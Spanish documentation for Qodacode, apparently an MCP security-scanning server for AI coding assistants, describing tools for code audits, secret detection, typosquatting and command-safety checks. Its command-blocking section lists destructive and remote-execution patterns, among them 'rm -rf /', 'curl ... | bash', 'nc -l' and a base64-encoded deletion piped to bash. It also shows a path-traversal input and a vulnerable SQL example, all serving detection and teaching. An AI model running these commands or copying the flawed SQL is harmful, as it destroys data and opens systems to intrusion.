# Qodacode MCP Server - Documentación

## ¿Qué es Qodacode MCP?

Qodacode MCP es un **servidor Model Context Protocol** que permite a asistentes de IA como Claude Code y Cursor usar Qodacode para análisis de código, escaneo de seguridad y verificación de calidad.

### Características Principales

- **4000+ reglas de seguridad** nativas y especializadas
- **Integración nativa con Claude Code y Cursor**
- **Motor híbrido de análisis** con 4 engines especializados
- **Salida rica** con sugerencias de fix y referencias CWE
- **Veredicto unificado**: READY FOR PRODUCTION / NOT READY
- **11 herramientas especializadas** para diferentes casos de uso
- **Output AI-friendly**: Formato JSON optimizado para que Claude/Cursor puedan actuar
- **30+ lenguajes soportados** (Python, JS, TS, Go, Java, Ruby, PHP, C, C++, Rust...)

---

## Instalación

### Prerrequisitos

- Python 3.10 o superior
- Claude Code o Cursor instalado

### Instalar Qodacode

```bash
pip install qodacode
```

### Configurar en Claude Code

```bash
qodacode setup-mcp
```

Esto añade automáticamente Qodacode a tu configuración de Claude Code.

### Configuración Manual

Si prefieres configurarlo manualmente, añade a `~/.claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "qodacode": {
      "command": "python",
      "args": ["-m", "qodacode.mcp_server"]
    }
  }
}
```

---

## Iniciar el Servidor

```bash
# Modo normal (para Claude Code)
qodacode serve

# O directamente
python -m qodacode.mcp_server
```

---

## Herramientas Disponibles (11 Tools)

### Resumen Rápido

| Tool | Descripción | Uso Principal |
|------|-------------|---------------|
| `full_audit` | Auditoría completa con todos los engines | Pre-deploy, CI/CD |
| `scan_code` | Escaneo rápido o profundo | Desarrollo diario |
| `scan_single_file` | Escanear un archivo específico | Tiempo real |
| `scan_diff` | Solo archivos cambiados (git-aware) | AI coding sessions |
| `fix_issue` | Generar fix para un issue | Auto-remediation |
| `check_secrets` | Detectar secretos y credenciales | Seguridad |
| `check_dependencies` | Verificar CVEs en dependencias | Seguridad |
| `check_typosquatting` | **NUEVO** Detectar ataques supply chain | Seguridad |
| `list_rules` | Listar reglas de análisis | Referencia |
| `explain_issue` | Explicar un issue específico | Aprendizaje |
| `get_project_health` | Obtener salud general del proyecto | Dashboards |

---

## Referencia de Tools

### `full_audit` - Auditoría Completa

La herramienta más exhaustiva. Ejecuta todos los engines de seguridad.

**Engines incluidos:**
1. **Secret Detection** - API keys, tokens, credenciales
2. **Core Analysis** - Patrones rápidos de seguridad
3. **Deep SAST** - Análisis estático avanzado
4. **Dependency Scanner** - CVEs en dependencias

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Directorio a auditar |

**Ejemplo de uso en Claude:**
```
"Ejecuta una auditoría completa del proyecto"
→ Claude llama: full_audit(path=".")
```

**Respuesta:**
```json
{
  "verdict": "✅ READY FOR PRODUCTION (5 warnings)",
  "ready_for_production": true,
  "summary": {
    "total_issues": 5,
    "production": {"critical": 0, "high": 2, "medium": 3},
    "tests": {"critical": 0, "high": 1, "medium": 2},
    "engines": {
      "secret_detection": {"status": "success", "count": 0},
      "core_analysis": {"status": "success", "count": 3},
      "deep_sast": {"status": "success", "count": 2},
      "dependency_scanner": {"status": "success", "count": 0}
    }
  },
  "issues": [...]
}
```

---

### `scan_code` - Escaneo de Código

Escaneo flexible con opciones de filtrado.

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Archivo o directorio a escanear |
| `mode` | string | `"fast"` | `"fast"` (core) o `"deep"` (incluye SAST) |
| `categories` | string | `null` | Filtro: security, robustness, maintainability, operability, dependencies |
| `severity_filter` | string | `null` | Mínimo: critical, high, medium, low |

**Ejemplos de uso en Claude:**
```
"Escanea solo problemas de seguridad críticos"
→ scan_code(path=".", categories="security", severity_filter="critical")

"Análisis profundo del src/"
→ scan_code(path="./src", mode="deep")
```

**Respuesta:**
```json
{
  "verdict": "⛔ NOT READY — Fix 1 critical issues",
  "ready_for_production": false,
  "mode": "fast",
  "engines": ["core_analysis"],
  "summary": {
    "files_scanned": 45,
    "files_with_issues": 12,
    "total_issues": 15,
    "production": {"critical": 1, "high": 5, "medium": 9},
    "tests": {"critical": 0, "high": 2, "medium": 3}
  },
  "issues": [...]
}
```

---

### `scan_single_file` - Escanear Un Archivo

Rápido y específico. Ideal para análisis en tiempo real.

**Parámetros:**
| Parámetro | Tipo | Descripción |
|-----------|------|-------------|
| `filepath` | string | Ruta al archivo a escanear |

**Ejemplo:**
```
"Revisa este archivo: src/auth.py"
→ scan_single_file(filepath="src/auth.py")
```

**Respuesta:**
```json
{
  "file": "src/auth.py",
  "issues_found": 2,
  "issues": [
    {
      "rule_id": "SEC-001",
      "rule_name": "hardcoded-secret",
      "severity": "critical",
      "line": 15,
      "message": "Hardcoded API key detected",
      "fix_suggestion": "Use environment variables"
    }
  ]
}
```

---

### `scan_diff` - Escaneo de Cambios (Git-aware) 🆕

**La tool más rápida.** Solo escanea archivos que han cambiado desde el último commit.

Ideal para sesiones de coding con AI donde el código cambia constantemente.

**Detecta:**
- Cambios staged (`git add`)
- Cambios unstaged (modificados pero no añadidos)
- Archivos untracked (nuevos, no en git)

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Directorio del proyecto (debe ser repo git) |
| `base` | string | `"HEAD"` | Referencia git para comparar |

**Ejemplo de uso en Claude:**
```
"Escanea solo los archivos que cambié"
→ scan_diff(path=".")

"Verifica mis cambios antes del commit"
→ scan_diff(path=".", base="HEAD")
```

**Respuesta:**
```json
{
  "verdict": "✅ READY FOR PRODUCTION (2 warnings)",
  "ready_for_production": true,
  "changed_files": 3,
  "files_list": ["src/api.py", "src/utils.py", "config.py"],
  "summary": {
    "total_issues": 2,
    "production": {"critical": 0, "high": 1, "medium": 1},
    "tests": {"critical": 0, "high": 0, "medium": 0}
  },
  "issues": [...]
}
```

---

### `fix_issue` - Generar Fix Automático 🆕

**Cierra el ciclo: Detectar → Explicar → Reparar.**

Genera código corregido que Claude/Cursor pueden aplicar directamente.

**Parámetros:**
| Parámetro | Tipo | Descripción |
|-----------|------|-------------|
| `file_path` | string | Ruta al archivo con el issue |
| `line` | int | Número de línea del issue |
| `rule_id` | string | ID de la regla (e.g., SEC-001, ROB-002) |
| `original_code` | string | Código problemático (opcional, para contexto) |

**Ejemplo de uso en Claude:**
```
"Arregla el SQL injection en api.py línea 42"
→ fix_issue(file_path="api.py", line=42, rule_id="SEC-002")
```

**Respuesta (AI-friendly):**
```json
{
  "rule_id": "SEC-002",
  "file": "api.py",
  "line": 42,
  "fix_available": true,
  "explanation": {
    "why_it_matters": "SQL injection allows attackers to execute arbitrary SQL...",
    "how_to_fix": "Use parameterized queries instead of string concatenation..."
  },
  "suggested_fix": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
  "fix_pattern": {
    "before": "f\"SELECT * FROM users WHERE id = {user_id}\"",
    "after": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
    "imports_needed": []
  },
  "original_context": [
    {"line": 40, "code": "def get_user(user_id):"},
    {"line": 41, "code": "    conn = get_db()"},
    {"line": 42, "code": "    query = f\"SELECT * FROM users WHERE id = {user_id}\""},
    {"line": 43, "code": "    return conn.execute(query)"}
  ],
  "cwe_id": "CWE-89",
  "cwe_url": "https://cwe.mitre.org/data/definitions/89.html"
}
```

**Flujo típico con Claude:**
```
1. Claude detecta issue con scan_diff()
2. Claude llama fix_issue() para obtener el fix
3. Claude aplica el fix al archivo
4. Claude verifica con scan_single_file()
```

---

### `check_secrets` - Detección de Secretos

Detección de credenciales con 700+ patrones y validación de entropía.

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Directorio a escanear |
| `include_git_history` | bool | `false` | Escanear historial de git |

**Detecta:**
- AWS, GCP, Azure credentials
- Stripe, GitHub, GitLab tokens
- JWT, API keys, private keys
- Database credentials
- Y 700+ patrones más

**Ejemplo:**
```
"Busca secretos en el historial de git"
→ check_secrets(path=".", include_git_history=true)
```

**Respuesta:**
```json
{
  "total_secrets_found": 2,
  "secrets": [
    {
      "file": "config.py",
      "line": 42,
      "type": "GL-aws-access-key",
      "severity": "critical",
      "message": "AWS Access Key detected",
      "cwe_id": "CWE-798",
      "cwe_url": "https://cwe.mitre.org/data/definitions/798.html"
    }
  ],
  "recommendation": "CRITICAL: Rotate all exposed secrets immediately."
}
```

---

### `check_dependencies` - Verificar Dependencias

Consulta bases de datos de vulnerabilidades en tiempo real.

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Directorio con archivos de dependencias |

**Soporta:**
- `requirements.txt` (Python)
- `package.json` (Node.js)
- `Pipfile.lock` (Python)
- `package-lock.json` (Node.js)

**Ejemplo:**
```
"Verifica vulnerabilidades en las dependencias"
→ check_dependencies(path=".")
```

**Respuesta:**
```json
{
  "files_checked": ["requirements.txt", "package.json"],
  "total_vulnerabilities": 3,
  "vulnerabilities": [
    {
      "package": "requests",
      "ecosystem": "PyPI",
      "vulnerability_id": "GHSA-xxx",
      "summary": "SSRF vulnerability in requests",
      "severity": "high",
      "source_file": "requirements.txt"
    }
  ],
  "recommendation": "Update vulnerable packages to patched versions."
}
```

---

### `check_typosquatting` - Detección de Supply Chain 🆕

Detecta ataques de typosquatting en dependencias del proyecto.

**Typosquatting**: Paquetes maliciosos con nombres similares a paquetes legítimos para engañar a desarrolladores.

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Directorio a escanear |

**Detecta:**
- `requirements.txt` (Python)
- `package.json` (Node.js)
- `Pipfile` / `Pipfile.lock` (Python)
- `pyproject.toml` (Python)

**Algoritmos:**
1. **Levenshtein Distance**: Detecta typos (distancia ≤ 2)
2. **Homoglyph Detection**: Caracteres similares (Cyrillic, Greek, números)
3. **Keyboard Proximity**: Teclas adyacentes en QWERTY
4. **Known Malicious**: Base de datos de 30+ ataques confirmados

**Ejemplo de uso en Claude:**
```
"Verifica que las dependencias sean seguras"
→ check_typosquatting(path=".")
```

**Respuesta (seguro):**
```json
{
  "verdict": "✓ SUPPLY CHAIN SAFE",
  "safe": true,
  "summary": {
    "total_suspicious": 0,
    "critical": 0,
    "high": 0,
    "medium": 0
  },
  "findings": [],
  "recommendation": "No suspicious packages detected."
}
```

**Respuesta (ataque detectado):**
```json
{
  "verdict": "🚨 SUPPLY CHAIN ATTACK DETECTED",
  "safe": false,
  "summary": {
    "total_suspicious": 1,
    "critical": 1,
    "high": 0,
    "medium": 0
  },
  "findings": [{
    "suspicious_package": "reqeusts",
    "legitimate_package": "requests",
    "risk_level": "critical",
    "reason": "Known malicious package impersonating 'requests'",
    "source_file": "requirements.txt"
  }],
  "recommendation": "CRITICAL: Remove malicious packages immediately."
}
```

---

### `list_rules` - Listar Reglas

Muestra todas las reglas de análisis disponibles (~4000+ reglas).

**Sin parámetros.**

**Ejemplo:**
```
"¿Qué reglas puede verificar Qodacode?"
→ list_rules()
```

**Respuesta:**
```json
{
  "total_rules": "3715+",
  "summary": "Qodacode provides 3715+ security rules across 4 specialized engines",
  "native_rules": {
    "count": 15,
    "by_category": {
      "security": [
        {"id": "SEC-001", "name": "hardcoded-secret", "severity": "critical"},
        {"id": "SEC-002", "name": "sql-injection", "severity": "critical"}
      ],
      "robustness": [...],
      "maintainability": [...],
      "operability": [...]
    }
  },
  "engines": {
    "secret_detection": {
      "name": "Qodacode Secret Detection",
      "rules_count": 700,
      "description": "700+ patterns for secrets, API keys, tokens"
    },
    "deep_sast": {
      "name": "Qodacode Deep SAST",
      "rules_count": 3000,
      "description": "3000+ rules for security, correctness, best practices",
      "languages": ["python", "javascript", "typescript", "go", "java", "ruby", "php", "c", "cpp", "rust"]
    },
    "dependency_scanner": {
      "name": "Qodacode Dependency Scanner",
      "description": "Real-time CVE database for dependencies"
    }
  },
  "coverage": {
    "secret_detection": "700+ patterns",
    "sast_analysis": "3000+ rules",
    "dependency_vulnerabilities": "Real-time CVE database",
    "ast_patterns": "15 rules"
  }
}
```

---

### `explain_issue` - Explicar Issue

Obtiene explicación detallada de una regla específica.

**Parámetros:**
| Parámetro | Tipo | Descripción |
|-----------|------|-------------|
| `rule_id` | string | ID de la regla (e.g., SEC-001) |
| `context` | string | Código para contexto específico (opcional) |

**Ejemplo:**
```
"Explícame qué es SEC-002"
→ explain_issue(rule_id="SEC-002")
```

**Respuesta:**
```json
{
  "rule_id": "SEC-002",
  "name": "sql-injection",
  "category": "security",
  "severity": "critical",
  "description": "Detects potential SQL injection vulnerabilities",
  "why_it_matters": "SQL injection allows attackers to execute arbitrary SQL commands, potentially reading, modifying, or deleting data...",
  "how_to_fix": "Use parameterized queries or ORM methods instead of string concatenation. Example: cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
  "languages": ["python", "javascript", "typescript"]
}
```

---

### `get_project_health` - Salud del Proyecto

Evaluación general con puntuación y recomendaciones priorizadas.

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `path` | string | `"."` | Directorio del proyecto |

**Sistema de Calificación:**
| Puntuación | Grado | Estado |
|------------|-------|--------|
| 90-100 | A | Excellent |
| 80-89 | B | Good |
| 70-79 | C | Needs Improvement |
| 60-69 | D | Poor |
| 0-59 | F | Critical |

**Ejemplo:**
```
"¿Cómo está la salud de este proyecto?"
→ get_project_health(path=".")
```

**Respuesta:**
```json
{
  "health_score": 85,
  "grade": "B",
  "status": "Good",
  "summary": {
    "files_analyzed": 52,
    "total_issues": 12,
    "critical": 0,
    "high": 3,
    "medium": 7,
    "low": 2
  },
  "by_category": {
    "security": 2,
    "robustness": 5,
    "maintainability": 3,
    "operability": 2
  },
  "priority_fixes": [
    {"rule": "SEC-001", "file": "config.py", "line": 42, "message": "..."}
  ],
  "recommendations": [
    "Reliability: Add error handling and timeouts to improve application stability."
  ]
}
```

---

## Veredicto de Producción

La lógica del veredicto es consistente con CLI y TUI:

```
if critical_issues_in_production > 0:
    ⛔ NOT READY — Fix N critical issues
else:
    ✅ READY FOR PRODUCTION (N warnings)
```

**Importante:**
- Solo issues en archivos de **producción** afectan el veredicto
- Archivos de **test** (`test_*.py`, `*_test.py`, `/tests/`) se reportan por separado
- Issues HIGH, MEDIUM, LOW son advertencias, no bloquean

---

## Mapeo CWE

Qodacode incluye referencias CWE automáticas para vulnerabilidades comunes:

| Tipo de Issue | CWE ID | Descripción |
|---------------|--------|-------------|
| Hardcoded Secrets | CWE-798 | Use of Hard-coded Credentials |
| SQL Injection | CWE-89 | Improper Neutralization of SQL |
| Command Injection | CWE-78 | Improper Neutralization of OS Commands |
| XSS | CWE-79 | Improper Neutralization of Input |
| Path Traversal | CWE-22 | Improper Limitation of Pathname |
| Deserialization | CWE-502 | Deserialization of Untrusted Data |
| Missing Auth | CWE-306 | Missing Authentication |

---

## Arquitectura

```
┌──────────────────────────────────────────────────────────────┐
│                    Claude Code / Cursor                       │
│                         (Cliente MCP)                         │
└────────────────────────────┬─────────────────────────────────┘
                             │ MCP Protocol (STDIO)
                             ▼
┌──────────────────────────────────────────────────────────────┐
│                   Qodacode MCP Server                         │
│                     (mcp_server.py)                           │
│  ┌────────────────────────────────────────────────────────┐  │
│  │                   10 MCP Tools                          │  │
│  │  full_audit | scan_code | scan_diff | fix_issue | ...   │  │
│  └────────────────────────────┬───────────────────────────┘  │
└───────────────────────────────┼──────────────────────────────┘
                                │
            ┌───────────────────┼───────────────────┐
            │                   │                   │
            ▼                   ▼                   ▼
    ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
    │    Core      │   │   Secret     │   │  Dependency  │
    │   Engine     │   │  Detection   │   │   Scanner    │
    │              │   │  + Deep SAST │   │              │
    └──────────────┘   └──────────────┘   └──────────────┘
```

---

## Ejemplos de Conversación con Claude

### Antes de un Commit
```
Usuario: "¿Puedo hacer commit de este código?"
Claude: [Llama full_audit]
Claude: "Encontré 1 issue crítico: tienes una API key hardcodeada
         en config.py línea 42. Deberías usar variables de entorno.
         Una vez lo arregles, el código estará listo para producción."
```

### Debugging de Seguridad
```
Usuario: "Revisa la seguridad del archivo auth.py"
Claude: [Llama scan_single_file(filepath="auth.py")]
Claude: "El archivo tiene 2 issues:
         1. SQL injection en línea 55 - usa queries parametrizadas
         2. Missing timeout en línea 78 - añade timeout a la request"
```

### Explicación Educativa
```
Usuario: "¿Qué significa SEC-002?"
Claude: [Llama explain_issue(rule_id="SEC-002")]
Claude: "SEC-002 es SQL Injection. Ocurre cuando construyes queries
         SQL concatenando strings con input del usuario. Un atacante
         puede manipular el input para ejecutar comandos SQL arbitrarios..."
```

---

## Solución de Problemas

### El servidor no aparece en Claude
```bash
# Verifica que esté configurado
qodacode setup-mcp

# Reinicia Claude Code
```

### "Tool not found" errors
```bash
# Verifica la instalación
qodacode doctor
```

### Engines no disponibles
```bash
# Algunos engines son opcionales
# El servidor funciona con lo que esté disponible
qodacode doctor
```

---

## 🆕 Nuevas Features v1.0.2 (Security Release)

### 1. 🛡️ Rate Limiting Integrado

Todos los tools del MCP server ahora incluyen protección contra uso excesivo:

**Herramientas protegidas:**
- `full_audit` - 60 escaneos/minuto máximo
- `scan_code` - 60 escaneos/minuto máximo
- `scan_diff` - 60 escaneos/minuto máximo
- Todas las demás herramientas de escaneo

**Respuesta cuando se excede el límite:**
```json
{
  "error": "rate_limit_exceeded",
  "message": "Rate limit: 60 scans/minute. Wait 23s",
  "retry_after_seconds": 23,
  "current_usage": {
    "scans_last_minute": 60,
    "scans_limit": 60
  }
}
```

**Configurar límites** en `.qodacode/config.json`:
```json
{
  "rate_limit": {
    "max_scans_per_minute": 100,
    "max_ai_calls_per_minute": 50,
    "enabled": true
  }
}
```

**Comportamiento en Claude Code:**
- Si Claude intenta escanear demasiado rápido, recibe el error de rate limit
- Claude puede informar al usuario: "Esperando 23 segundos por límite de velocidad..."
- El límite se reinicia cada minuto

**Nota importante**: Rate limiting es por-instancia del servidor MCP. Si ejecutas múltiples sesiones de Claude, cada una tiene sus propios límites.

---

### 2. 📝 Audit Logging Automático

Todas las operaciones del MCP server se registran automáticamente en `.qodacode/audit.jsonl`:

**Eventos registrados:**
- Cada llamada a tool (full_audit, scan_code, etc.) con parámetros y resultados
- Rate limiting activado (operaciones rechazadas)
- Errores durante escaneos o análisis
- Métricas de rendimiento (duración de escaneos)

**Formato JSON Lines** (una línea por evento):
```json
{"timestamp":"2026-01-22T14:23:45.123Z","event":"mcp_tool_call","details":{"tool":"full_audit","path":".","findings_count":3,"verdict":"READY","duration_ms":1843}}
{"timestamp":"2026-01-22T14:24:12.456Z","event":"rate_limit","details":{"tool":"scan_code","limit":"60/min","wait_time_s":15}}
{"timestamp":"2026-01-22T14:24:30.789Z","event":"mcp_tool_call","details":{"tool":"scan_diff","changed_files":3,"findings_count":1,"duration_ms":892}}
```

**Seguridad crítica:** Los logs automáticamente enmascaran secretos (API keys, tokens, credenciales) antes de escribir a disco. Nunca verás datos sensibles en los logs.

**Casos de uso:**
- **Compliance**: Auditorías SOC2, GDPR, ISO 27001
- **Debugging**: Rastrear qué tools usa Claude y con qué frecuencia
- **Analytics**: Métricas de uso del servidor MCP
- **Security monitoring**: Detectar patrones sospechosos de uso

**Ver logs en tiempo real:**
```bash
tail -f .qodacode/audit.jsonl | jq .
```

---

### 3. 🆕 Tool: `analyze_command_safety`

**Nueva herramienta para PreToolUse hooks** - Analiza la seguridad de comandos antes de ejecutarse.

**Propósito:** Cuando Claude Code u otros AI assistants intentan ejecutar comandos bash/python, este tool detecta patrones peligrosos y recomienda BLOCK o ALLOW.

**Parámetros:**
| Parámetro | Tipo | Default | Descripción |
|-----------|------|---------|-------------|
| `command` | string | - | Comando a analizar |
| `tool_name` | string | `"bash"` | Tipo de herramienta: bash, python, sh |

**Detección de patrones peligrosos:**
- **Destructivos**: `rm -rf /`, `rm -rf ~`, `del /s`
- **Privilegios**: `sudo rm`, `chmod 777`, `chown root`
- **Exfiltración**: `curl ... | bash`, `wget ... | sh`, `nc -l`
- **Ejecución de código**: `eval()`, `exec()`, `os.system()`, `__import__`

**Detección de bypass attempts:**
- **Base64 encoding**: `echo abc123... | base64 -d`
- **Hex encoding**: `\x72\x6d` (rm en hex)
- **URL encoding**: `%72%6d` (rm en URL)
- **Ofuscación**: Concatenación excesiva, variables sospechosas

**Ejemplo de uso:**
```json
// Claude intenta ejecutar: rm -rf /tmp/old_files
{
  "tool": "analyze_command_safety",
  "arguments": {
    "command": "rm -rf /tmp/old_files",
    "tool_name": "bash"
  }
}
```

**Respuesta (comando seguro):**
```json
{
  "recommendation": "ALLOW",
  "is_safe": true,
  "reason": "Command appears safe",
  "command": "rm -rf /tmp/old_files",
  "warnings": []
}
```

**Respuesta (comando peligroso):**
```json
{
  "recommendation": "BLOCK",
  "is_safe": false,
  "reason": "BLOCK: Dangerous pattern detected: rm\\s+-rf\\s+/",
  "command": "rm -rf /",
  "safe_alternative": "Consider using 'trash' or 'rm -i' for interactive deletion, or be more specific with paths",
  "detected_patterns": ["file_destruction"],
  "severity": "critical"
}
```

**Respuesta (bypass attempt detectado):**
```json
{
  "recommendation": "BLOCK",
  "is_safe": false,
  "reason": "BLOCK: Base64-encoded dangerous command: rm -rf /home/user...",
  "command": "echo cm0gLXJmIC9ob21lL3VzZXI= | base64 -d | bash",
  "detected_patterns": ["encoding_bypass", "file_destruction"],
  "severity": "critical"
}
```

**Integración con PreToolUse hooks:**

Claude Code puede llamar este tool automáticamente antes de ejecutar comandos bash:

```javascript
// En claude_desktop_config.json (conceptual)
{
  "preToolUse": {
    "bash": {
      "validator": "qodacode.analyze_command_safety"
    }
  }
}
```

**Flujo típico:**
1. Claude quiere ejecutar `curl api.example.com/data | bash`
2. PreToolUse hook llama `analyze_command_safety`
3. Tool responde: `BLOCK` (exfiltración detectada)
4. Claude informa al usuario: "No puedo ejecutar este comando - es potencialmente peligroso"
5. Claude sugiere alternativa segura

---

### 4. ⚡ Primera Ejecución del MCP Server

La primera vez que Claude Code llame a `full_audit`, `scan_code` (deep), o `check_secrets`:

**Lo que ve Claude:**
```json
{
  "message": "First-time setup: Installing security engines...",
  "progress": "Installing Gitleaks v8.18.4... 45%",
  "estimated_time": "30 seconds remaining"
}
```

**Lo que pasa:**
- Descarga automática de Gitleaks (15MB)
- Instalación de Semgrep vía pip (100MB)
- Solo ocurre una vez por sistema
- Instalación con progress tracking

**Después de la primera vez:** Todos los escaneos son instantáneos.

**Entornos restringidos** (Docker read-only, CI sin permisos):
```json
{
  "warning": "Could not install Gitleaks: Permission denied",
  "fallback": "Continuing with available engines (core analysis only)",
  "recommendation": "Install Gitleaks manually or run with appropriate permissions"
}
```

El servidor continúa funcionando con los engines disponibles.

---

### 5. 🔐 Security Hooks (Backend)

Aunque no son herramientas MCP directamente, v1.0.2 incluye capas de seguridad en el backend:

**Protecciones automáticas:**
- Validación de paths (previene path traversal)
- Sanitización de parámetros
- Detección de comandos inyectados en parámetros
- Rate limiting por tipo de operación

**Ejemplo de protección automática:**
```json
// Claude intenta: scan_code(path="../../../etc/passwd")
// Respuesta del servidor:
{
  "error": "invalid_path",
  "message": "Path traversal attempt detected",
  "blocked": true
}
```

---

### 6. 📊 FAQ v1.0.2 para MCP

**P: ¿El rate limiting afecta a múltiples proyectos simultáneos?**
R: No. Cada instancia del MCP server (cada sesión de Claude Code) tiene sus propios límites independientes. Si trabajas en 3 proyectos a la vez en 3 ventanas de Claude, cada una tiene 60 scans/min.

**P: ¿Los audit logs consumen mucho espacio?**
R: No. Cada evento MCP es ~300 bytes. 10,000 operaciones = ~3MB. Crece lentamente.

**P: ¿Puedo deshabilitar el rate limiting?**
R: Sí, en `.qodacode/config.json` pon `"rate_limit": {"enabled": false}`. No recomendado si Claude tiene acceso automático.

**P: ¿`analyze_command_safety` previene todos los ataques?**
R: No es 100% infalible. Detecta patrones conocidos y bypass attempts comunes. Siempre revisa comandos críticos manualmente.

**P: ¿Qué pasa si cancelo la primera instalación de engines?**
R: El servidor continúa con engines disponibles. Puedes reintentar llamando a full_audit de nuevo más tarde.

**P: ¿El audit logging afecta el rendimiento?**
R: Impacto mínimo (<5ms por operación). Los logs se escriben de forma asíncrona.

---

## Versiones

| Versión | Cambios |
|---------|---------|
| 1.0.2 | **Security Release**: Rate limiting en todos los tools, audit logging automático, **nueva tool `analyze_command_safety`** para PreToolUse hooks, first-run UX mejorada, security hooks backend |
| 0.5.0 | 11 tools MCP: **`check_typosquatting`** (detección supply chain attacks) |
| 0.3.0 | 10 tools MCP: `scan_diff` (git-aware), `fix_issue` (auto-remediation), output AI-friendly |
| 0.2.0 | 8 tools MCP, veredicto unificado, mapeo CWE |
| 0.1.0 | Lanzamiento inicial MCP |

---

## Contribuir

Ver [CONTRIBUTING.md](CONTRIBUTING.md) para guías de contribución.

## Licencia

AGPL-3.0 License - ver [LICENSE](LICENSE) para detalles.
